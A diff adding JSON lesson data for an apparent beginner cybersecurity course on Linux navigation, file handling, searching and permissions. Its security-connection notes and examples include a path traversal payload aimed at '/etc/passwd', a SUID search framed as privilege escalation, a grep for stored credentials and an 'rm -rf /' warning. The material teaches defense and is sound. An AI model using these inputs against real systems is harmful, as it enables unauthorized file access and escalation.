+        "definition": "A path relative to your current location (e.g., `../documents` or `./script.sh`)."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. The Linux Unified Directory Tree",
+        "content": "Unlike Windows, which uses separate drive letters (`C:\\`, `D:\\`), Linux organizes everything under a single unified root directory represented by a single forward slash: `/`.\n\nKey system directories include:\n\u2022 `/`: The root directory of the entire filesystem.\n\u2022 `/home`: Personal user directories (e.g., `/home/cadet`).\n\u2022 `/etc`: System configuration files (network settings, users, web server configs).\n\u2022 `/var/log`: System and application log files.\n\u2022 `/bin` & `/usr/bin`: Executable programs and utilities (`ls`, `cat`, `whoami`).\n\u2022 `/tmp`: Temporary files (anyone can write here; cleared on reboot)."
+      },
+      {
+        "title": "2. The Big Three: pwd, ls, and cd",
+        "content": "\u2022 **`pwd` (Print Working Directory)**: Tells you where you are right now.\n  `cadet@endlessus:~$ pwd` -> `/home/cadet`\n\n\u2022 **`ls` (List)**: Shows what is inside your current folder.\n  `ls -la`: The `-l` flag gives a long detailed list (permissions, size, date); `-a` shows all files including **hidden files** (files beginning with a dot like `.bashrc`).\n\n\u2022 **`cd` (Change Directory)**: Moves you to another folder.\n  `cd /etc`: Moves to `/etc`.\n  `cd ~` or just `cd`: Instantly brings you back to your home directory."
+      },
+      {
+        "title": "3. Absolute vs Relative Paths & The Special Dots",
+        "content": "Understanding paths is essential:\n\n\u2022 **Absolute Path**: Starts with a leading `/`. It points to an exact location on the filesystem no matter where you are:\n  `cd /var/log/nginx`\n\n\u2022 **Relative Path**: Does NOT start with `/`. It starts from wherever you are right now:\n  If you are in `/var`, typing `cd log` moves you into `/var/log`.\n\n\u2022 **The Dot (`.`)**: Represents the *current* directory.\n\u2022 **The Double Dot (`..`)**: Represents the *parent* directory (one level up).\n  `cd ..` moves up one level!"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Navigating up and down the filesystem tree",
+        "codeOrDiagram": "cadet@endlessus:~$ pwd\n/home/cadet\n\ncadet@endlessus:~$ cd ..\ncadet@endlessus:/home$ pwd\n/home\n\ncadet@endlessus:/home$ cd /etc/nginx\ncadet@endlessus:/etc/nginx$ pwd\n/etc/nginx\n\ncadet@endlessus:/etc/nginx$ cd ~\ncadet@endlessus:~$ pwd\n/home/cadet",
+        "explanation": "Notice how `cd ..` steps up to `/home`, `cd /etc/nginx` jumps via absolute path, and `cd ~` returns home."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `pwd` in the terminal to print your current absolute directory location:",
+      "initialCommand": "",
+      "expectedCommand": "pwd",
+      "simulatedOutput": "/home/cadet\n[+] Current directory identified: /home/cadet",
+      "explanation": "`pwd` prints the absolute path of the current working directory."
+    },
+    "questions": [
+      {
+        "id": "q-08-1",
+        "type": "exact",
+        "question": "Which Linux command displays the full absolute path of your current working directory?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "pwd"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Print Working Directory abbreviation.",
+        "explanation": "`pwd` stands for Print Working Directory."
+      },
+      {
+        "id": "q-08-2",
+        "type": "exact",
+        "question": "Which two-character relative path shorthand refers to the parent directory immediately one level up?",
+        "visualSlots": "_ _",
+        "acceptedAnswers": [
+          "..",
+          "dot dot"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Two periods together.",
+        "explanation": "'..' always refers to the parent directory in Unix/Linux."
+      },
+      {
+        "id": "q-08-3",
+        "type": "multiple-choice",
+        "question": "Which flag added to `ls` forces the display of hidden files (files beginning with a dot like `.bashrc`)?",
+        "options": [
+          "-h",
+          "-a",
+          "-r",
+          "-z"
+        ],
+        "correctIndex": 1,
+        "hint": "Short for 'all'.",
+        "explanation": "The `-a` (or `--all`) flag tells `ls` not to ignore entries starting with `.`."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Verify current directory",
+        "instruction": "Print your current working directory path with `pwd`.",
+        "hints": [
+          "Type: `pwd`"
+        ]
+      }
+    ],
+    "securityConnection": "Web vulnerabilities like **Path Traversal (Directory Traversal)** exploit relative paths. An attacker supplies `../../../../etc/passwd` in a vulnerable web file parameter to trick the web application into walking out of the web root folder into sensitive operating system configuration files!",
+    "id": "room-08",
+    "nextRoomId": "room-09"
+  },
+  {
+    "stage": 2,
+    "level": 2,
+    "levelTitle": "Level 2 \u2014 Linux Fundamentals",
+    "title": "Creating, Moving & Deleting Files (touch, mkdir, cp, mv, rm)",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 08: Navigating the Filesystem",
+    "whyAreYouHere": "Security professionals create exploit scripts, copy log files for evidence preservation, move binaries to temporary locations, and remove test artifacts after an assessment. In this room, you will master file manipulation commands and learn why `rm -rf` must be used with extreme caution.",
+    "objectives": [
+      "Create new empty files using `touch`",
+      "Create single and nested directories using `mkdir` and `mkdir -p`",
+      "Copy files and folders using `cp` and recursive `cp -r`",
+      "Move and rename files using `mv`",
+      "Safely delete files with `rm` and folders with `rm -r`",
+      "Understand why there is no 'Recycle Bin' in the Linux terminal"
+    ],
+    "vocabulary": [
+      {
+        "term": "touch",
+        "definition": "Creates a new empty file if it doesn't exist, or updates timestamps if it does."
+      },
+      {
+        "term": "mkdir (make directory)",
+        "definition": "Creates one or more new directories."
+      },
+      {
+        "term": "cp (copy)",
+        "definition": "Duplicates files or directories from a source to a destination."
+      },
+      {
+        "term": "mv (move)",
+        "definition": "Moves files or directories, and also used to rename files in place."
+      },
+      {
+        "term": "rm (remove)",
+        "definition": "Permanently deletes files from the filesystem."
+      },
+      {
+        "term": "Recursive (-r / -R)",
+        "definition": "An option that causes a command to apply to a directory AND all files/folders nested within it."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Creating Files and Directories",
+        "content": "\u2022 **`touch [filename]`**: Instantly creates an empty file.\n  `touch report.txt`\n\n\u2022 **`mkdir [dirname]`**: Creates a new folder.\n  `mkdir recon`\n  If you want to create a nested hierarchy of folders in one command, use the `-p` (parents) flag:\n  `mkdir -p targets/acmefin/nmap` creates `targets`, `acmefin` inside it, and `nmap` inside that!"
+      },
+      {
+        "title": "2. Copying and Moving (Renaming) Files",
+        "content": "\u2022 **`cp [source] [destination]`**: Copies a file.\n  `cp notes.txt backup_notes.txt`\n  To copy an entire directory and all its contents, you MUST use the recursive flag `-r`:\n  `cp -r tools/ /tmp/tools/`\n\n\u2022 **`mv [source] [destination]`**: Moves a file OR renames it.\n  In Linux, renaming is just moving a file to a new name in the same folder!\n  `mv old_name.txt new_name.txt`\n  `mv exploit.py /tmp/` (moves `exploit.py` into `/tmp` directory)."
+      },
+      {
+        "title": "3. Deleting Files with rm \u2014 There is No Recycle Bin!",
+        "content": "**CRITICAL WARNING**: In a graphical desktop, deleting a file moves it to the 'Trash' or 'Recycle Bin'. In the Linux terminal, `rm` deletes files **permanently and immediately**.\n\n\u2022 `rm notes.txt`: Deletes a single file.\n\u2022 `rm -r folder_name`: Recursively deletes a folder and everything inside it.\n\u2022 `rm -rf folder_name`: The `-f` (force) flag forces deletion without asking for confirmation, ignoring errors.\n\n*Never run `rm -rf /` or `rm -rf /*`\u2014it will permanently wipe the entire operating system!*"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Workflow: Create, Copy, Rename, and Remove",
+        "codeOrDiagram": "cadet@endlessus:~$ touch test.txt\ncadet@endlessus:~$ cp test.txt copy.txt\ncadet@endlessus:~$ mv copy.txt renamed.txt\ncadet@endlessus:~$ ls\nrenamed.txt  test.txt\ncadet@endlessus:~$ rm test.txt renamed.txt\ncadet@endlessus:~$ ls\n(empty)",
+        "explanation": "This sequence shows creating, duplicating, renaming, and permanently removing files."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Create an empty file called `audit.log` using the `touch` command:",
+      "initialCommand": "",
+      "expectedCommand": "touch audit.log",
+      "simulatedOutput": "[+] File created: audit.log successfully created in current directory.",
+      "explanation": "`touch` creates a zero-byte file if it does not already exist."
+    },
+    "questions": [
+      {
+        "id": "q-09-1",
+        "type": "exact",
+        "question": "Which Linux command is used to duplicate files or directories from one location to another?",
+        "visualSlots": "_ _",
+        "acceptedAnswers": [
+          "cp",
+          "copy"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Two-letter abbreviation for copy.",
+        "explanation": "`cp` stands for copy."
+      },
+      {
+        "id": "q-09-2",
+        "type": "exact",
+        "question": "Which command is used both to move files between directories and to rename a file in place?",
+        "visualSlots": "_ _",
+        "acceptedAnswers": [
+          "mv",
+          "move"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Two-letter abbreviation for move.",
+        "explanation": "`mv` stands for move."
+      },
+      {
+        "id": "q-09-3",
+        "type": "multiple-choice",
+        "question": "What flag must be passed to `cp` or `rm` to make the operation recursive through all nested subdirectories?",
+        "options": [
+          "-a",
+          "-r",
+          "-z",
+          "-k"
+        ],
+        "correctIndex": 1,
+        "hint": "Short for recursive.",
+        "explanation": "The `-r` (or `-R`) flag instructs commands to traverse directories recursively."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Create a file with touch",
+        "instruction": "Create `audit.log` using `touch audit.log`.",
+        "hints": [
+          "Type: `touch audit.log`"
+        ]
+      }
+    ],
+    "securityConnection": "During incident response cleanup or post-exploitation, ethical hackers must carefully record every file they create on a client system and delete them when testing completes (cleanup phase) to leave the client environment in its original state.",
+    "id": "room-09",
+    "nextRoomId": "room-10"
+  },
+  {
+    "stage": 2,
+    "level": 2,
+    "levelTitle": "Level 2 \u2014 Linux Fundamentals",
+    "title": "Viewing & Searching Files (cat, head, tail, grep, find)",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 09: Creating, Moving & Deleting Files",
+    "whyAreYouHere": "Security analysts spend hours reading configuration files, inspecting log files with millions of lines, and searching for stored credentials. Opening a 2GB log file in a graphical text editor will freeze your computer. In this room, you will master the essential command-line tools to view and filter text instantaneously.",
+    "objectives": [
+      "Print entire files with `cat` (concatenate)",
+      "Inspect the beginning of files with `head` and the end with `tail`",
+      "Monitor growing log files in real time using `tail -f`",
+      "Search for words and patterns across files using `grep` and case-insensitive `grep -i`",
+      "Locate files anywhere on the filesystem using `find`"
+    ],
+    "vocabulary": [
+      {
+        "term": "cat (concatenate)",
+        "definition": "Reads one or more files and prints their entire contents sequentially to standard output."
+      },
+      {
+        "term": "head",
+        "definition": "Outputs the first N lines of a file (defaults to first 10 lines)."
+      },
+      {
+        "term": "tail",
+        "definition": "Outputs the last N lines of a file (defaults to last 10 lines)."
+      },
+      {
+        "term": "tail -f (follow)",
+        "definition": "Keeps the file open and displays new lines in real time as they are written by applications."
+      },
+      {
+        "term": "grep",
+        "definition": "Global Regular Expression Print. Searches text files for lines matching a specified string or regex pattern."
+      },
+      {
+        "term": "find",
+        "definition": "Searches directory trees for files matching criteria like filename, size, permissions, or modification date."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Reading Text Files: cat, head, and tail",
+        "content": "\u2022 **`cat [file]`**: Prints the whole file to your screen. Great for small files:\n  `cat /etc/issue`\n  *Warning*: Do not run `cat` on a massive 500,000-line log file, or your screen will scroll endlessly!\n\n\u2022 **`head -n [number] [file]`**: Shows just the top lines of a file:\n  `head -n 5 /etc/passwd` shows the first 5 user accounts.\n\n\u2022 **`tail -n [number] [file]`**: Shows just the bottom lines of a file:\n  `tail -n 10 /var/log/auth.log` shows the 10 most recent login attempts.\n\n\u2022 **`tail -f [file]` (Real-Time Monitoring)**: The `-f` flag 'follows' the file live! As web visitors hit a server, new log entries stream onto your screen instantly. Press `Ctrl + C` to stop."
+      },
+      {
+        "title": "2. Searching Inside Files with grep",
+        "content": "`grep` is one of the most powerful utilities in Linux. It searches files line-by-line and outputs only the lines containing your search term:\n\n`grep [options] \"search_term\" [filename]`\n\nEssential flags:\n\u2022 `-i`: **Case-insensitive** (matches 'admin', 'Admin', or 'ADMIN').\n\u2022 `-n`: Displays the **line number** where the match occurred.\n\u2022 `-v`: **Inverts the match** (prints all lines that do NOT contain the term).\n\u2022 `-r`: **Recursive** search through all files in a directory:\n  `grep -ri \"password\" /var/www/html/` searches every website file for the word 'password'!"
+      },
+      {
+        "title": "3. Locating Files with find",
+        "content": "`grep` searches *inside* file contents. `find` searches for the *files themselves* across the directory tree:\n\n\u2022 Find by name:\n  `find / -name \"*.conf\" 2>/dev/null`\n  Searches the entire disk (`/`) for files ending in `.conf`. (`2>/dev/null` silences permission denied warnings).\n\n\u2022 Find by type:\n  `find /home -type f -name \"notes.txt\"` (`-type f` for files, `-type d` for directories).\n\n\u2022 Find by permission (Privilege Escalation!):\n  `find / -perm -4000 -type f 2>/dev/null` searches for SUID executables that run with root privileges!"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Searching /etc/passwd with grep",
+        "codeOrDiagram": "cadet@endlessus:~$ grep -i \"root\" /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n\ncadet@endlessus:~$ grep -i \"cadet\" /etc/passwd\ncadet:x:1001:1001:Endlessus Cadet:/home/cadet:/bin/bash",
+        "explanation": "`grep -i` filters `/etc/passwd` to extract only lines mentioning the requested user account."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `cat /etc/passwd | head -n 3` to print the first 3 lines of the system password database:",
+      "initialCommand": "",
+      "expectedCommand": "cat /etc/passwd | head -n 3",
+      "simulatedOutput": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n[+] Inspection successful: First 3 system accounts displayed.",
+      "explanation": "`cat` reads `/etc/passwd` and pipes the output into `head -n 3`."
+    },
+    "questions": [
+      {
+        "id": "q-10-1",
+        "type": "exact",
+        "question": "Which Linux tool is used to search text for lines matching regular expressions or specific keyword strings?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "grep"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Global Regular Expression Print.",
+        "explanation": "`grep` searches file contents for matching string patterns."
+      },
+      {
+        "id": "q-10-2",
+        "type": "multiple-choice",
+        "question": "Which flag allows `tail` to continuously monitor and display new lines added to a log file in real time?",
+        "options": [
+          "-r",
+          "-f",
+          "-m",
+          "-v"
+        ],
+        "correctIndex": 1,
+        "hint": "Follow flag.",
+        "explanation": "`tail -f` (follow) monitors files in real time as new data is appended."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect password database",
+        "instruction": "Run `cat /etc/passwd | head -n 3` in the terminal.",
+        "hints": [
+          "Type: `cat /etc/passwd | head -n 3`"
+        ]
+      }
+    ],
+    "securityConnection": "During security audits, analysts use `grep -ri 'api_key\\|secret\\|password' /app/` to hunt for hardcoded credentials accidentally left in source code or backup files.",
+    "id": "room-10",
+    "nextRoomId": "room-11"
+  },
+  {
+    "stage": 2,
+    "level": 2,
+    "levelTitle": "Level 2 \u2014 Linux Fundamentals",
+    "title": "Linux Permissions & Ownership (chmod, chown, sudo)",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 10: Viewing & Searching Files",
+    "whyAreYouHere": "Linux permissions are the primary defense against unauthorized access. If a web server configuration file containing database credentials is set to 'world-readable' (`666` or `777`), any unprivileged attacker on the system can read it immediately. In this room, you will master the `rwx` permission triad and octal notation.",
+    "objectives": [
+      "Understand the 3 permission levels: User (Owner), Group, and Others (World)",
+      "Deconstruct the `rwx` permission bits (Read = 4, Write = 2, Execute = 1)",
+      "Calculate octal permission masks (755, 644, 600, 777)",
+      "Change file permissions using `chmod`",
+      "Change file ownership using `chown`",
+      "Execute administrative commands safely using `sudo`"
+    ],
+    "vocabulary": [
+      {
+        "term": "rwx (Read, Write, Execute)",
+        "definition": "The three permissions in Unix: Read (view content), Write (modify or delete), and Execute (run as a program)."
+      },
+      {
+        "term": "chmod (change mode)",
+        "definition": "Modifies the permission access bits on files and directories."
+      },
+      {
+        "term": "chown (change owner)",
+        "definition": "Changes the user owner and/or group owner of a file or directory."
+      },
+      {
+        "term": "Octal Notation",
+        "definition": "A 3-digit numeric representation of permissions where r=4, w=2, x=1 (e.g. 7 = rwx, 6 = rw-, 4 = r--, 0 = ---)."
+      },
+      {
+        "term": "sudo (superuser do)",
+        "definition": "Allows authorized users to execute a command with root security privileges."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Reading the Permission String: -rwxr-xr--",
+        "content": "When you run `ls -la`, the first column displays a 10-character string:\n\n`- rwx r-x r--`\n\n\u2022 **Character 1 (File Type)**: `-` means standard file; `d` means directory; `l` means symbolic link.\n\u2022 **Characters 2-4 (User/Owner)**: Permissions for the user who owns the file (`rwx` = can read, write, and execute).\n\u2022 **Characters 5-7 (Group)**: Permissions for members of the file's assigned group (`r-x` = can read and execute, but cannot modify).\n\u2022 **Characters 8-10 (Others/World)**: Permissions for EVERYONE else on the entire computer (`r--` = read-only)."
+      },
+      {
+        "title": "2. Octal Math: The Numbers Behind chmod",
+        "content": "In cybersecurity, permissions are almost always set using **octal numbers**:\n\n\u2022 **Read (`r`)** = 4\n\u2022 **Write (`w`)** = 2\n\u2022 **Execute (`x`)** = 1\n\u2022 **None (`-`)** = 0\n\nAdd the numbers together for each of the three tiers (User, Group, Others):\n\n\u2022 `rwx` = 4 + 2 + 1 = **7**\n\u2022 `rw-` = 4 + 2 + 0 = **6**\n\u2022 `r-x` = 4 + 0 + 1 = **5**\n\u2022 `r--` = 4 + 0 + 0 = **4**\n\u2022 `---` = 0 + 0 + 0 = **0**\n\nCommon combinations:\n\u2022 `chmod 755 script.sh`: Owner can read/write/run (7); everyone else can read/run (55).\n\u2022 `chmod 644 document.txt`: Owner can read/write (6); everyone else read-only (44).\n\u2022 `chmod 600 id_rsa`: Private SSH key! Owner only can read/write (6); NO ONE ELSE has any access (00)!\n\u2022 `chmod 777 file`: DANGEROUS! Everyone in the world can modify, execute, or delete it!"
+      },
+      {
+        "title": "3. Changing Ownership and Elevating with sudo",
+        "content": "\u2022 **`chown [user]:[group] [file]`**: Changes who owns the file. Only root can transfer ownership:\n  `sudo chown cadet:cadet config.php`\n\n\u2022 **`sudo [command]`**: Stands for 'Superuser Do'. It allows an authorized user to run a single command as `root` without permanently logging into the dangerous root shell.\n  `sudo systemctl restart nginx`"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Securing a world-writable configuration file",
+        "codeOrDiagram": "cadet@endlessus:~$ ls -l config.php\n-rw-rw-rw- 1 cadet cadet 840 Oct 15 11:00 config.php\n[!] Vulnerability: config.php is world-writable (666)!\n\ncadet@endlessus:~$ chmod 600 config.php\ncadet@endlessus:~$ ls -l config.php\n-rw------- 1 cadet cadet 840 Oct 15 11:00 config.php\n[+] Hardened: Only owner can read/write; others blocked.",
+        "explanation": "`chmod 600` strips group and other permissions, restricting access to the owner."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Audit permissions on config.php with `ls -la config.php`:",
+      "initialCommand": "",
+      "expectedCommand": "ls -la config.php",
+      "simulatedOutput": "-rw-rw-rw- 1 cadet cadet 840 Oct 15 11:00 config.php\n[!] Notice: Permissions -rw-rw-rw- mean world-writable (octal 666).",
+      "explanation": "`ls -la` reveals detailed permission flags."
+    },
+    "questions": [
+      {
+        "id": "q-11-1",
+        "type": "exact",
+        "question": "What 3-digit octal permission value gives the file owner full read and write access while completely denying all access to group members and others?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "600"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Read (4) + Write (2) = 6 for owner; 0 for group; 0 for others.",
+        "explanation": "600 represents rw------- (read/write for owner only)."
+      },
+      {
+        "id": "q-11-2",
+        "type": "multiple-choice",
+        "question": "If a file has permissions `-rwxr-xr--`, what permission does a member of the file's assigned group possess?",
+        "options": [
+          "Read, write, and execute",
+          "Read and execute only (r-x)",
+          "Read only (r--)",
+          "No access (---)"
+        ],
+        "correctIndex": 1,
+        "hint": "Inspect characters 5-7: r-x.",
+        "explanation": "Characters 5-7 represent group permissions: 'r-x' equals read and execute."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Audit file permissions",
+        "instruction": "Inspect permissions of `config.php` using `ls -la config.php`.",
+        "hints": [
+          "Type: `ls -la config.php`"
+        ]
+      }
+    ],
+    "securityConnection": "In Linux Privilege Escalation, attackers search for world-writable system files (like `/etc/passwd` or `/etc/cron.d/job`). If an unprivileged user can edit a cron job that runs as root, they can inject malicious commands and gain root access!",
